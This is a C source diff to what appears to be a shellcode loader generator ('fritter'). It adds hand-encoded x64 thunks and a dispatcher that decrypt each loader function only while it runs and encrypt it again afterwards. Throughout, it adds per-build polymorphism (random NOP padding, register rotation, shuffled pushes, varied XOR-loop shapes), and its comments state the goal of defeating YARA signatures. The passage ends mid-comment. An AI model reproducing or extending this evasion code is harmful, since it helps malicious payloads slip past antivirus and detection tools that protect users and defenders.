@@ -33,7 +33,13 @@
 
 #include "loader_peb1_exe_x64.h"
 #include "loader_peb2_exe_x64.h"
-#include "veh_shim_exe_x64.h"
+#include "dispatch_shim_exe_x64.h"
+/* Function-granular dispatch companion tables, emitted by exe2h alongside
+   the blob headers above. Consumed only under N>1 dispatch mode. */
+#include "loader_peb1_fn_table_x64.h"
+#include "loader_peb1_ref_table_x64.h"
+#include "loader_peb2_fn_table_x64.h"
+#include "loader_peb2_ref_table_x64.h"
   
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
@@ -1077,6 +1083,600 @@ static int save_loader(PFRITTER_CONFIG c) {
     return err;
 }
 
+/* ============================================================
+ * Function-granular dispatch: opcode emitters
+ * ============================================================
+ *
+ * These helpers emit the byte sequences fritter appends to the tail
+ * of the loader blob when N>1 per-function dispatch is engaged:
+ *
+ *   [loader_original][dispatcher_bytes][thunk_0]..[thunk_N-1]
+ *
+ * The dispatcher and thunks are RESIDENT (plaintext at runtime); the
+ * shim's runtime fn_table has one resident entry covering their span
+ * so the shim's decrypt loop skips them. Cross-section calls in the
+ * loader are rewritten so their disp32 targets a thunk; each thunk
+ * loads r10=target_blob_off, r11=callee_id, and tail-jumps to the
+ * dispatcher, which decrypts the callee, calls it, and re-encrypts.
+ *
+ * MS x64 ABI is preserved end-to-end: caller's args reach the callee
+ * in rcx/rdx/r8/r9 unchanged, rax returns; r10/r11 are volatile so
+ * their use as dispatch metadata carriers is ABI-legal.
+ *
+ * All opcodes below hand-verified against Intel SDM Vol 2.
+ */
+
+/* Emit an x86-64 NOP of exactly `len` bytes (0..15) with random content
+   in the disp fields. Uses the 0F 1F /r multi-byte NOP family; on P6+
+   the CPU decodes NOP r/m for length only and never dereferences the
+   effective address, so the ModR/M/SIB/disp bytes are free entropy. For
+   len 10..15 the core is 9 bytes preceded by 66-prefix stacking (the
+   documented long-NOP form emitted by MSVC/GCC). Returns bytes written. */
+static uint32_t emit_rnd_nop(uint8_t *out, uint32_t len) {
+    if(len == 0) return 0;
+    if(len > 15) len = 15;
+    uint8_t rnd[8];
+    gen_random(rnd, 8);
+    uint8_t *p = out;
+    uint32_t core = len;
+    while(core > 9) { *p++ = 0x66; core--; }
+    switch(core) {
+        case 1:
+            *p++ = 0x90;
+            break;
+        case 2:
+            *p++ = 0x66; *p++ = 0x90;
+            break;
+        case 3:
+            /* Randomize between mem-form [rax] (ModR/M=00) and reg-form
+               eax (ModR/M=C0); both decode as NOP. */
+            *p++ = 0x0F; *p++ = 0x1F;
+            *p++ = (rnd[0] & 1) ? 0xC0 : 0x00;
+            break;
+        case 4:
+            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x40;
+            *p++ = rnd[0];
+            break;
+        case 5:
+            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x44; *p++ = 0x00;
+            *p++ = rnd[0];
+            break;
+        case 6:
+            *p++ = 0x66; *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x44; *p++ = 0x00;
+            *p++ = rnd[0];
+            break;
+        case 7:
+            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x80;
+            memcpy(p, rnd, 4); p += 4;
+            break;
+        case 8:
+            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x84; *p++ = 0x00;
+            memcpy(p, rnd, 4); p += 4;
+            break;
+        case 9:
+            *p++ = 0x66; *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x84; *p++ = 0x00;
+            memcpy(p, rnd, 4); p += 4;
+            break;
+    }
+    return (uint32_t)(p - out);
+}
+
+#define THUNK_SIZE 17u  /* mov r10d,imm32; mov r11d,imm32; jmp rel32 = 6+6+5 */
+
+/* Emit one thunk into `out`. Returns bytes written (== THUNK_SIZE).
+ *   target_blob_off, where within the loader blob the callee's
+ *                     specific entry point lives (loader-base-relative).
+ *   callee_id      , index into the runtime fn_table.
+ *   dispatcher_rel , signed rel32 from end-of-jmp to dispatcher entry.
+ *                     Positive if dispatcher precedes... actually
+ *                     dispatcher is BEFORE thunks in blob order
+ *                     ([loader][dispatcher][thunks]) so this is
+ *                     always negative.
+ */
+/* Two independent per-build variations coordinate thunk with dispatcher:
+ *   input_swap == 0: r10 = target_blob_off, r11 = callee_id (canonical)
+ *   input_swap == 1: r11 = target_blob_off, r10 = callee_id (swapped)
+ * Both emit_thunk and emit_dispatcher receive the same input_swap so the
+ * two agree on which volatile scratch reg carries which value. */
+static uint32_t emit_thunk(uint8_t *out,
+                           uint32_t target_blob_off,
+                           uint32_t callee_id,
+                           int32_t  dispatcher_rel,
+                           int      input_swap)
+{
+    uint8_t *p = out;
+    /* Semantic role → mov opcode byte. r10 = 0xBA (mov r10d, imm32),
+       r11 = 0xBB. Swap flips which one holds which value. */
+    uint8_t target_op = input_swap ? 0xBB : 0xBA;
+    uint8_t id_op     = input_swap ? 0xBA : 0xBB;
+    /* Randomize which mov comes first per callsite (independent axis
+       from input_swap). Kills the fixed 12-byte prefix that would
+       otherwise repeat verbatim across every thunk. */
+    uint8_t order;
+    gen_random(&order, 1);
+    if(order & 1) {
+        *p++ = 0x41; *p++ = id_op;
+        memcpy(p, &callee_id, 4); p += 4;
+        *p++ = 0x41; *p++ = target_op;
+        memcpy(p, &target_blob_off, 4); p += 4;
+    } else {
+        *p++ = 0x41; *p++ = target_op;
+        memcpy(p, &target_blob_off, 4); p += 4;
+        *p++ = 0x41; *p++ = id_op;
+        memcpy(p, &callee_id, 4); p += 4;
+    }
+    /* jmp rel32 (E9 disp32) */
+    *p++ = 0xE9;
+    memcpy(p, &dispatcher_rel, 4); p += 4;
+    return (uint32_t)(p - out);
+}
+
+/* State-register emission helpers. Every helper takes register indices
+   in the 12..15 range (r12/r13/r14/r15) and emits the correct REX +
+   ModR/M bytes for the requested operation. Used by both emit_xor_loop
+   (for size/key regs) and emit_dispatcher (for the full role rotation).
+
+   All uses of ModR/M rm=100 need SIB (encodes "index+base" instead of
+   "base"); r12 as a memory base triggers this (r12 has low3=4, which
+   collides with rsp's encoding). r13 as memory base with mod=00 would
+   be interpreted as RIP-relative, so we always emit disp8=0 form to
+   keep encoding uniform across roles. Costs one byte per load vs the
+   variable "shortest form", worth the simplicity. */
+
+/* Emit `mov <dst>d, [<base>+disp8]`. dst/base must be in r8..r15 range. */
+static uint32_t emit_mov_r32_at_ptr(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
+    uint8_t *p = out;
+    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
+    uint8_t base_high = (base >= 8) ? 1 : 0;
+    uint8_t dst_low3  = dst  & 7;
+    uint8_t base_low3 = base & 7;
+    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
+    *p++ = 0x8B;                                   /* MOV r32, r/m32       */
+    if(base_low3 == 4) {
+        *p++ = 0x40 | (dst_low3 << 3) | 4;         /* mod=01 rm=100 (SIB)  */
+        *p++ = 0x24;                                /* SIB idx=none base=4  */
+        *p++ = (uint8_t)disp;
+    } else {
+        *p++ = 0x40 | (dst_low3 << 3) | base_low3; /* mod=01 rm=base       */
+        *p++ = (uint8_t)disp;
+    }
+    return (uint32_t)(p - out);
+}
+
+/* Emit `movzx <dst>d, byte [<base>+disp8]`. */
+static uint32_t emit_movzx_r32_mem8(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
+    uint8_t *p = out;
+    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
+    uint8_t base_high = (base >= 8) ? 1 : 0;
+    uint8_t dst_low3  = dst  & 7;
+    uint8_t base_low3 = base & 7;
+    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
+    *p++ = 0x0F; *p++ = 0xB6;                      /* MOVZX r32, r/m8      */
+    if(base_low3 == 4) {
+        *p++ = 0x40 | (dst_low3 << 3) | 4;
+        *p++ = 0x24;
+        *p++ = (uint8_t)disp;
+    } else {
+        *p++ = 0x40 | (dst_low3 << 3) | base_low3;
+        *p++ = (uint8_t)disp;
+    }
+    return (uint32_t)(p - out);
+}
+
+/* Emit one XOR-in-place loop that toggles a region with a byte key.
+ *
+ * Caller pre-loads:
+ *   rax       = base address of region
+ *   size_reg  = size in bytes (upper 32 bits zero, comes from `mov r32,...`)
+ *   key_reg   = byte key (in low 8 bits)
+ *
+ * size_reg and key_reg are register indices in the 12..15 range (r12..r15).
+ * They're chosen by the dispatcher's per-build role rotation and passed
+ * through so the XOR loop's terminator/setup/xor opcodes vary with the
+ * rotation as well.
+ *
+ * Per emission we randomize three axes independently:
+ *
+ *   1. Helper register from the 6-way clobber-safe pool
+ *      {rcx, rdx, rbx, rsi, r8, r9}. rbp is excluded, the dispatcher's
+ *      NONVOL_REGS push list doesn't save it, so using it would corrupt
+ *      the outer caller's rbp on return. rax/rdi/r10-r15 are all live
+ *      during the loop.
+ *
+ *   2. Direction: forward (inc rax) or reverse (dec rax, rax pre-loaded
+ *      to base+size-1). XOR is self-inverse per byte so direction is
+ *      independent per call, any combo of decrypt/reencrypt directions
+ *      still round-trips the region.
+ *
+ *   3. Shape: how the loop terminates. Both use the same jnz opcode
+ *      0x75 as the final byte pair, so the "shape signature" differs
+ *      in the 3 bytes immediately preceding it:
+ *        - counter-shape: setup `mov helper_d, size_reg_d`; each iter
+ *          `dec helper ; jnz`. Helper counts down from size to 0.
+ *        - addr-shape:    setup `lea helper, [rax +/- ...]` capturing
+ *          end/limit ptr; each iter `cmp rax, helper ; jne`. Loop ends
+ *          when rax equals the pre-computed limit.
+ *
+ *   4. 0..4 bytes of NOP junk via emit_rnd_nop at 4 gap sites inside
+ *      the body, 50% skip per gap. 0F 1F /r NOPs don't touch flags so
+ *      they are safe between the terminator's flag-setting op and jnz.
+ *
+ * Post-loop:
+ *   rax, helper reg, and flags all clobbered, caller must restore
+ *   rax if needed (dispatcher reloads from rdi for loop2).
+ */
+static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
+    /* rex_b = REX.B (r/m extension) or REX.R (reg extension), same
+       bit numeric value in the REX byte; low3 = 3-bit register field.
+       Excludes rbp (5), not in NONVOL_REGS push list. */
+    static const struct { uint8_t rex_b; uint8_t low3; } CTR[6] = {
+        {0, 1}, /* rcx */
+        {0, 2}, /* rdx */
+        {0, 3}, /* rbx */
+        {0, 6}, /* rsi */
+        {1, 0}, /* r8  */
+        {1, 1}, /* r9  */
+    };
+    uint8_t rnd[3], jrnd[4];
+    gen_random(rnd, 3);
+    gen_random(jrnd, 4);
+    uint32_t cidx       = rnd[0] % 6;
+    int      rev        = rnd[1] & 1;
+    int      addr_shape = rnd[2] & 1;
+    uint8_t  crex = CTR[cidx].rex_b;
+    uint8_t  clow = CTR[cidx].low3;
+    /* size_reg / key_reg are always in r12..r15 range under N>1 dispatch,
+       so their REX high bit is always 1. Split into high-bit + low3. */
+    uint8_t sz_low3  = size_reg & 7;
+    uint8_t key_low3 = key_reg  & 7;
+
+    uint8_t *p    = out;
+
+    /* Setup order matters for addr-shape + reverse: the LEA needs rax
+       still at base to capture the correct limit (base - 1), so it
+       goes BEFORE the rax reverse setup. */
+    if(addr_shape && rev) {
+        /* lea helper, [rax - 1]  (limit = base - 1)
+           REX: W=1, R=crex; opcode 8D; ModR/M mod=01 reg=clow rm=000; disp8=0xFF */
+        *p++ = 0x48 | (crex << 2);
+        *p++ = 0x8D;
+        *p++ = 0x40 | (clow << 3);
+        *p++ = 0xFF;
+    }
+
+    /* Reverse rax setup: rax = base + size - 1 (point to last byte). */
+    if(rev) {
+        /* add rax, size_reg64
+           REX: W=1, R=1 (size_reg high), B=0 (rax); opcode 01;
+           ModR/M mod=11 reg=sz_low3 rm=000 */
+        *p++ = 0x4C;
+        *p++ = 0x01;
+        *p++ = 0xC0 | (sz_low3 << 3);
+        /* dec rax */
+        *p++ = 0x48; *p++ = 0xFF; *p++ = 0xC8;
+    }
+
+    if(addr_shape && !rev) {
+        /* lea helper, [rax + size_reg*1]  (limit = base + size)
+           REX: W=1, R=crex, X=1 (size_reg high); opcode 8D;
+           ModR/M mod=00 reg=clow rm=100 (SIB); SIB scale=00 idx=sz_low3 base=000 */
+        *p++ = 0x48 | (crex << 2) | 0x02;
+        *p++ = 0x8D;
+        *p++ = 0x04 | (clow << 3);
+        *p++ = (sz_low3 << 3);
+    }
+
+    if(!addr_shape) {
+        /* counter-shape setup: mov helper_d, size_reg_d
+           REX: W=0, R=1 (size_reg high), B=crex (helper dst); opcode 89;
+           ModR/M mod=11 reg=sz_low3 rm=clow */
+        *p++ = 0x44 | crex;
+        *p++ = 0x89;
+        *p++ = 0xC0 | (sz_low3 << 3) | clow;
+    }
+
+    #define XJUNK(i) do { \
+        if(jrnd[i] & 1) { \
+            uint32_t _len = 1 + ((jrnd[i] >> 1) & 0x03); /* 1..4 */ \
+            p += emit_rnd_nop(p, _len); \
+        } \
+    } while(0)
+
+    XJUNK(0);
+    uint8_t *loop_top = p;
+
+    /* xor byte [rax], key_reg_b
+       REX: W=0, R=1 (key_reg high); opcode 30; ModR/M mod=00 reg=key_low3 rm=0 */
+    *p++ = 0x44;
+    *p++ = 0x30;
+    *p++ = (key_low3 << 3);
+
+    XJUNK(1);
+
+    /* inc/dec rax (64-bit forms only, 32-bit inc eax would zero the
+       upper 32 bits of the pointer and break it) */
+    *p++ = 0x48; *p++ = 0xFF; *p++ = rev ? 0xC8 : 0xC0;
+
+    XJUNK(2);
+
+    if(addr_shape) {
+        /* cmp rax, helper
+           REX: W=1, R=crex; opcode 39; ModR/M mod=11 reg=clow rm=0 (rax) */
+        *p++ = 0x48 | (crex << 2);
+        *p++ = 0x39;
+        *p++ = 0xC0 | (clow << 3);
+    } else {
+        /* dec helper */
+        if(crex) *p++ = 0x41;
+        *p++ = 0xFF;
+        *p++ = 0xC8 | clow;
+    }
+
+    XJUNK(3);
+
+    /* jne/jnz rel8 back to loop_top (same opcode 0x75 for both) */
+    *p++ = 0x75;
+    int32_t disp = (int32_t)(loop_top - (p + 1));
+    *p++ = (uint8_t)(int8_t)disp;
+
+    #undef XJUNK
+    return (uint32_t)(p - out);
+}
+
+/* Emit the dispatcher into `out`. Returns bytes written.
+ *   self_off , dispatcher's own blob offset (relative to combined blob start,
+ *               which is where LEA rip+disp arithmetic will land)
+ *   loader_off , loader region's blob offset (= shim_padded_size)
+ *   ft_off     , fn_table_area's blob offset (marker-relative, inside shim)
+ *
+ * ABI on entry (from thunk tail-jmp):
+ *   r10 = target_blob_off (loader-blob-relative callee entry point)
+ *   r11 = callee_id (index into fn_table)
+ *   rcx/rdx/r8/r9 = callee's args (must reach callee untouched)
+ *   [rsp] = caller's post-CALL return address
+ *
+ * Frame layout after prologue (rsp-relative):
+ *   [+0x00..+0x1F] shadow space for the callee we CALL
+ *   [+0x20..+0x27] spilled rcx
+ *   [+0x28..+0x2F] spilled rdx
+ *   [+0x30..+0x37] spilled r8
+ *   [+0x38..+0x3F] spilled r9
+ *   [+0x40..+0x47] rax save (callee's return value across re-encrypt)
+ *   [+0x48..+0x5F] pad
+ */
+static uint32_t emit_dispatcher(uint8_t *out,
+                                uint32_t self_off,
+                                uint32_t loader_off,
+                                uint32_t ft_off,
+                                int      input_swap)
+{
+    uint8_t *p = out;
+    /* input_swap agrees with emit_thunk on which volatile scratch reg
+       carries which value:
+         swap==0: r10=target_off, r11=callee_id
+         swap==1: r11=target_off, r10=callee_id
+       Two dispatcher instructions below (`mov PTR_d, id_reg_d` and
+       `add rax, target_reg`) pick their source reg based on this. */
+    uint8_t id_src_low3     = input_swap ? 2 : 3;  /* r10 low3 : r11 low3 */
+    uint8_t target_src_low3 = input_swap ? 3 : 2;
+    #define D_OFF() ((uint32_t)(p - out))
+    #define RIP_DISP32(target_off) do { \
+        int32_t _d = (int32_t)(target_off) - (int32_t)(self_off + D_OFF() + 4); \
+        memcpy(p, &_d, 4); p += 4; \
+    } while(0)
+
+    /* --- State-register role rotation. Randomly permute 4 roles across
+       {r12, r13, r14, r15} per build. Every ModR/M byte referencing
+       these regs varies per build (24 permutations = ~4.6 bits of
+       entropy on top of everything else). Roles:
+         PTR: fn_entry ptr, later loader_base, 64-bit
+         OFF: fn_entry.offset, u32 (upper 32 zeroed by mov r32)
+         SZ:  fn_entry.size  , u32
+         KEY: fn_entry.key   , byte in low 8
+       emit_xor_loop is passed SZ and KEY so the XOR-loop opcodes vary
+       with the rotation as well. */
+    static const uint8_t STATE_REGS[4] = {12, 13, 14, 15};
+    uint8_t roles[4];
+    memcpy(roles, STATE_REGS, 4);
+    {
+        uint8_t rnd_bytes[4];
+        gen_random(rnd_bytes, 4);
+        for(int i = 3; i > 0; i--) {
+            int j = rnd_bytes[i] % (i + 1);
+            uint8_t t = roles[i];
+            roles[i] = roles[j];
+            roles[j] = t;
+        }
+    }
+    uint8_t PTR      = roles[0];
+    uint8_t OFF      = roles[1];
+    uint8_t SZ       = roles[2];
+    uint8_t KEY      = roles[3];
+    uint8_t PTR_low3 = PTR & 7;
+    uint8_t OFF_low3 = OFF & 7;
+
+    /* --- Prologue: save the 7 nonvolatiles we clobber, in random
+     * order per build. Pop order in the epilogue mirrors this array
+     * in reverse. Reg ids: 3=rbx, 6=rsi, 7=rdi, 12=r12, 13=r13,
+     * 14=r14, 15=r15. Total push bytes = 3*1 + 4*2 = 11 regardless
+     * of order, so frame layout after `sub rsp, 0x60` is unchanged.
+     * RSP: 8 mod 16 on entry (from CALL), 7 pushes → 0 mod 16. */
+    static const uint8_t NONVOL_REGS[7] = {3, 6, 7, 12, 13, 14, 15};
+    uint8_t save_order[7];
+    memcpy(save_order, NONVOL_REGS, 7);
+    {
+        uint8_t rnd_bytes[7];
+        gen_random(rnd_bytes, 7);
+        for(int i = 6; i > 0; i--) {
+            int j = rnd_bytes[i] % (i + 1);
+            uint8_t t = save_order[i];
+            save_order[i] = save_order[j];
+            save_order[j] = t;
+        }
+    }
+    /* 50% chance of no junk at a given gap, else 1..4 bytes emitted via
+       emit_rnd_nop (0F 1F /r NOP family with random disp bytes). Safe
+       between any two consecutive PUSH or POP instructions, the CPU
+       decodes NOP r/m for length only, never touches memory. RIP-rel
+       disps computed by RIP_DISP32 self-correct: they use D_OFF() at
+       emission time so earlier junk only shrinks the emitted disp. */
+    #define EMIT_JUNK() do { \
+        uint8_t _r; gen_random(&_r, 1); \
+        if(_r & 1) { \
+            uint32_t _len = 1 + ((_r >> 1) & 0x03); /* 1..4 bytes */ \
+            p += emit_rnd_nop(p, _len); \
+        } \
+    } while(0)
+
+    for(int i = 0; i < 7; i++) {
+        uint8_t r = save_order[i];
+        if(r < 8) {
+            *p++ = 0x50 + r;              /* push r        (low-8)  */
+        } else {
+            *p++ = 0x41; *p++ = 0x50 + (r - 8); /* push r  (high-8)  */
+        }
+        if(i < 6) EMIT_JUNK();  /* gap between consecutive pushes */
+    }
+
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x60;  /* sub rsp, 0x60 */
+
+    /* --- Spill arg regs into frame --- */
+    /* EMIT_JUNK() between spills breaks the 20-byte block of 4
+       identical-shape `mov [rsp+X], reg` instructions. NOPs from
+       0F 1F /r don't touch flags, don't reference memory, and are
+       safe between any mov/mov, mov/lea, add/mov, or mov/call pair
+       in this middle section. */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20; /* mov [rsp+0x20], rcx */
+    EMIT_JUNK();
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x54; *p++ = 0x24; *p++ = 0x28; /* mov [rsp+0x28], rdx */
+    EMIT_JUNK();
+    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x30; /* mov [rsp+0x30], r8  */
+    EMIT_JUNK();
+    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x38; /* mov [rsp+0x38], r9  */
+
+    /* --- Locate fn_table entry: rsi = &fn_table_area[16 + id*12] --- */
+    *p++ = 0x48; *p++ = 0x8D; *p++ = 0x35;          /* lea rsi, [rip+ft_disp] */
+    RIP_DISP32(ft_off);
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC6; *p++ = 0x10;  /* add rsi, 16 (skip marker+count+pad) */
+
+    EMIT_JUNK();
+    /* mov PTR_d, <id_src>_d  (callee_id → PTR).
+       REX: W=0, R=1 (id_src high), B=1 (PTR high) */
+    *p++ = 0x45;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (id_src_low3 << 3) | PTR_low3;
+    EMIT_JUNK();
+    /* imul PTR, PTR, 12  (entry size). REX: W=1, R=1, B=1 */
+    *p++ = 0x4D;
+    *p++ = 0x6B;
+    *p++ = 0xC0 | (PTR_low3 << 3) | PTR_low3;
+    *p++ = 0x0C;
+    EMIT_JUNK();
+    /* add PTR, rsi  (PTR = &entries[id]).
+       opcode 01; REX: W=1, R=0 (rsi low), B=1 (PTR high);
+       ModR/M mod=11 reg=6 (rsi low3) rm=PTR_low3 */
+    *p++ = 0x49;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (6 << 3) | PTR_low3;
+
+    /* --- Load fn_entry fields into nonvolatile regs --- */
+    EMIT_JUNK();
+    p += emit_mov_r32_at_ptr(p, OFF, PTR, 0);   /* mov OFF_d, [PTR+0]      (offset) */
+    EMIT_JUNK();
+    p += emit_mov_r32_at_ptr(p, SZ,  PTR, 4);   /* mov SZ_d,  [PTR+4]      (size)   */
+    EMIT_JUNK();
+    p += emit_movzx_r32_mem8(p, KEY, PTR, 8);   /* movzx KEY_d, byte [PTR+8] (key)  */
+
+    /* --- Compute loader_base into PTR (reuse, done with fn_entry ptr) --- */
+    EMIT_JUNK();
+    *p++ = 0x48; *p++ = 0x8D; *p++ = 0x05;          /* lea rax, [rip+lb_disp] */
+    RIP_DISP32(loader_off);
+    /* mov PTR, rax  (PTR = loader_base).
+       opcode 89 (mov r/m64, r64); reg=src=rax (0), rm=dst=PTR.
+       REX: W=1, R=0 (rax low), B=1 (PTR high) */
+    *p++ = 0x49;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (0 << 3) | PTR_low3;
+
+    /* --- XOR-decrypt callee region: rdi = base = loader_base + OFF --- */
+    EMIT_JUNK();
+    /* add rax, OFF  (loader_base + offset).
+       opcode 01; REX: W=1, R=1 (OFF high), B=0 (rax low);
+       ModR/M mod=11 reg=OFF_low3 rm=0 (rax) */
+    *p++ = 0x4C;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (OFF_low3 << 3);
+    /* OFF is 32-bit clean (upper zeroed by earlier mov r32). Adding a full
+       64-bit reg is fine, high 32 bits are 0. */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0xC7;          /* mov rdi, rax (save decrypt base) */
+
+    /* XOR-decrypt: randomized helper, direction, shape, and body junk.
+       size_reg=SZ, key_reg=KEY driven by the role rotation. */
+    p += emit_xor_loop(p, SZ, KEY);
+
+    /* --- Restore args and call callee at loader_base + r10 --- */
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20; /* mov rcx, [rsp+0x20] */
+    EMIT_JUNK();
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x54; *p++ = 0x24; *p++ = 0x28; /* mov rdx, [rsp+0x28] */
+    EMIT_JUNK();
+    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x30; /* mov r8,  [rsp+0x30] */
+    EMIT_JUNK();
+    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x38; /* mov r9,  [rsp+0x38] */
+
+    /* Compute callee entry: rax = loader_base + target_reg (r10 or r11) */
+    EMIT_JUNK();
+    /* mov rax, PTR (PTR = loader_base).
+       opcode 89; reg=src=PTR, rm=dst=rax (0).
+       REX: W=1, R=1 (PTR high), B=0 (rax low) */
+    *p++ = 0x4C;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (PTR_low3 << 3);
+    EMIT_JUNK();
+    /* add rax, <target_reg>.
+       opcode 01; reg=target_src, rm=rax (0).
+       REX: W=1, R=1 (target high), B=0 (rax low) */
+    *p++ = 0x4C;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (target_src_low3 << 3);
+    EMIT_JUNK();
+    *p++ = 0xFF; *p++ = 0xD0;                       /* call rax */
+
+    /* Save return value */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x40; /* mov [rsp+0x40], rax */
+
+    /* --- XOR-re-encrypt callee region using saved base (rdi) --- */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0xF8;          /* mov rax, rdi */
+
+    /* Independent roll of helper, direction, shape, and junk from loop1;
+       same size_reg/key_reg driven by the role rotation. */
+    p += emit_xor_loop(p, SZ, KEY);
+
+    /* Restore rax (callee's return value) */
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x40; /* mov rax, [rsp+0x40] */
+
+    /* --- Epilogue: pop in reverse of the prologue's save_order --- */
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x60; /* add rsp, 0x60 */
+    for(int i = 6; i >= 0; i--) {
+        uint8_t r = save_order[i];
+        if(r < 8) {
+            *p++ = 0x58 + r;              /* pop r         (low-8)  */
+        } else {
+            *p++ = 0x41; *p++ = 0x58 + (r - 8); /* pop r   (high-8)  */
+        }
+        if(i > 0) EMIT_JUNK();  /* gap between consecutive pops */
+    }
+    *p++ = 0xC3;                                     /* ret     */
+    #undef EMIT_JUNK
+
+    #undef D_OFF
+    #undef RIP_DISP32
+    return (uint32_t)(p - out);
+}
+
+/* Rough upper bound for the emitted dispatcher (used to reserve buffer
+   space). Actual size is ~186-240 with XOR-loop shape variation. */
+#define DISPATCHER_MAX_SIZE 384u
+
 /**
  * Function: build_loader
  * ----------------------------
@@ -1129,70 +1729,59 @@ static int build_loader(PFRITTER_CONFIG c) {
     // --- Feature 6: Select random PEB walk loader variant ---
     unsigned char *loader_blob;
     uint32_t       loader_size;
+    /* Companion tables for N>1 per-function dispatch. Matched to the
+       chosen peb variant so fn_table offsets are consistent with the
+       actual loader blob's section layout. */
+    const fn_meta_t *L_FNS;
+    uint32_t         L_FN_COUNT;
+    const ref_t     *L_REFS;
+    uint32_t         L_REF_COUNT;
 
     gen_random(&rnd_byte, 1);
     switch(rnd_byte % 2) {
       case 0:
         loader_blob = LOADER_PEB1_EXE_X64;
         loader_size = sizeof(LOADER_PEB1_EXE_X64);
+        L_FNS       = LOADER_PEB1_FNS;
+        L_FN_COUNT  = LOADER_PEB1_FN_COUNT;
+        L_REFS      = LOADER_PEB1_REFS;
+        L_REF_COUNT = LOADER_PEB1_REF_COUNT;
         DPRINT("Selected PEB walk order 1 (InMemoryOrderModuleList)");
         break;
       default:
         loader_blob = LOADER_PEB2_EXE_X64;
         loader_size = sizeof(LOADER_PEB2_EXE_X64);
+        L_FNS       = LOADER_PEB2_FNS;
+        L_FN_COUNT  = LOADER_PEB2_FN_COUNT;
+        L_REFS      = LOADER_PEB2_REFS;
+        L_REF_COUNT = LOADER_PEB2_REF_COUNT;
         DPRINT("Selected PEB walk order 2 (InInitializationOrderModuleList)");
         break;
     }
 
-    // --- Feature 2A: Junk fall-through prefix (0-47 bytes, no jump) ---
+    // --- Feature 2A: Junk fall-through prefix (0-63 bytes, no jump) ---
     //
-    // Per output, fill 0-47 bytes from a pool of safe no-op instructions.
-    // The bytes execute as no-ops and fall through to the CALL - there is
-    // no "jump-over-junk" anchor (no leading EB/E9/etc.) for YARA rules
-    // to position from. Length AND internal layout vary per output: at any
-    // given total length, the choice of which instruction occupies which
-    // byte position differs, since pool entries are 1..9 bytes wide.
+    // Per output, fill 0-63 bytes of NOP instructions with random content
+    // in the disp fields. The bytes execute as no-ops and fall through to
+    // the CALL - there is no "jump-over-junk" anchor (no leading EB/E9/etc.)
+    // for YARA rules to position from.
     //
-    // Pool members are documented no-op forms. The CPU's NOP family
-    // (0F 1F /0 etc.) accepts a ModR/M byte that looks like memory
-    // addressing but is recognized as a NOP and performs no memory
-    // access - safe even when RAX is uninitialized at entry.
-    static const struct { uint8_t b[9]; uint8_t n; } pfx_pool[] = {
-        {{0x90},                                                  1}, // nop
-        {{0xF8},                                                  1}, // clc
-        {{0xF9},                                                  1}, // stc
-        {{0xF5},                                                  1}, // cmc
-        {{0x66, 0x90},                                            2}, // 66 nop
-        {{0x0F, 0x1F, 0x00},                                      3}, // nop dword [rax]
-        {{0x0F, 0x1F, 0xC0},                                      3}, // nop eax (reg form)
-        {{0x48, 0x87, 0xC0},                                      3}, // xchg rax, rax
-        {{0x0F, 0x1F, 0x40, 0x00},                                4}, // nop dword [rax+0]
-        {{0x0F, 0x1F, 0x44, 0x00, 0x00},                          5}, // nop dword [rax+rax+0]
-        {{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00},                    6}, // nop word [rax+rax+0]
-        {{0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00},              7}, // nop dword [rax+0]
-        {{0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},        8}, // nop dword [rax+rax+0]
-        {{0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},  9}, // nop word [rax+rax+0]
-    };
-    #define PFX_POOL_COUNT (sizeof(pfx_pool)/sizeof(pfx_pool[0]))
-
+    // Uses emit_rnd_nop, which emits the 0F 1F /r multi-byte NOP family
+    // with random disp bytes. On P6+ the CPU decodes NOP r/m for length
